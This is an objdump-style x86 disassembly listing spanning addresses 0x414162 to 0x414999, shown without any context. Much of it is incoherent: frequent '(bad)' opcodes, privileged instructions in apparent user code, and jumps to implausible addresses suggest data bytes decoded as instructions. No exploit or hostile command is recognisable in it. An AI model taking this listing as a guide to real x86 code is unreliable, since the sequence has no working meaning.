  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
  414170:	or     al,0x5e
  414172:	inc    eax
  414173:	add    BYTE PTR [ebx],al
  414175:	data16 and BYTE PTR [ebp+0x50],al
  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
